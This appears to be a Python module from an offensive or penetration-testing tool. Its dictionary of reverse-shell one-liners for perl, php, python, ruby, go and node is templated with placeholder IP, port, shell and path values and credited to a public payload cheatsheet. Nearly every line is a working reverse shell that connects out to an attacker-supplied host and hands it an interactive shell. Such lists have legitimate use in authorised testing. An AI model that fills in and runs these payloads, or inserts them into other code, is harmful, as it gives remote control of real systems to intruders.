# Source: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
bins = {
    "perl": [
        'PATHHERE -e \'use Socket;$i="IPHERE";$p=PORTHERE;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("SHELLHERE -i");};\'',
    ],
    "php": [
        'PATHHERE -r \'$sock=fsockopen("IPHERE",PORTHERE);exec("SHELLHERE -i <&3 >&3 2>&3");\'',
        'PATHHERE -r \'$sock=fsockopen("IPHERE",PORTHERE);shell_exec("SHELLHERE -i <&3 >&3 2>&3");\'',
        "PATHHERE -r '$sock=fsockopen(\"IPHERE\",PORTHERE);`SHELLHERE -i <&3 >&3 2>&3`;'",
        'PATHHERE -r \'$sock=fsockopen("IPHERE",PORTHERE);system("SHELLHERE -i <&3 >&3 2>&3");\'',
        'PATHHERE -r \'$sock=fsockopen("IPHERE",PORTHERE);passthru("SHELLHERE -i <&3 >&3 2>&3");\'',
        'PATHHERE -r \'$sock=fsockopen("IPHERE",PORTHERE);popen("SHELLHERE -i <&3 >&3 2>&3", "r");\'',
    ],
    "python": [
        'PATHHERE -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPHERE",PORTHERE));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("SHELLHERE")\'',
        'PATHHERE -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPHERE",PORTHERE));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["SHELLHERE","-i"])\'',
        'PATHHERE -c \'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPHERE",PORTHERE));subprocess.call(["SHELLHERE","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\'',
    ],
    # TODO Add support for multiple binaries with the same payload list.
    "python3": [
        'PATHHERE -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPHERE",PORTHERE));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("SHELLHERE")\'',
        'PATHHERE -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPHERE",PORTHERE));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["SHELLHERE","-i"])\'',
        'PATHHERE -c \'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPHERE",PORTHERE));subprocess.call(["SHELLHERE","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\'',
    ],
    "ruby": [
        'PATHHERE -rsocket -e\'exit if fork;c=TCPSocket.new("IPHERE","PORTHERE");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}\''
    ],
    "go": [
        'export GOCACHE=/tmp; echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","IPHERE:PORTHERE");cmd:=exec.Command("SHELLHERE");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && PATHHERE run /tmp/t.go && rm /tmp/t.go'
    ],
    "node": [
        'echo \'(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("SHELLHERE", []); var client = new net.Socket(); client.connect(PORTHERE, "IPHERE", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();\' > /tmp/t.js && node /tmp/t.js && rm /tmp/t.js'
    ],
}

shells = [
    "bash",
    "sh",
]
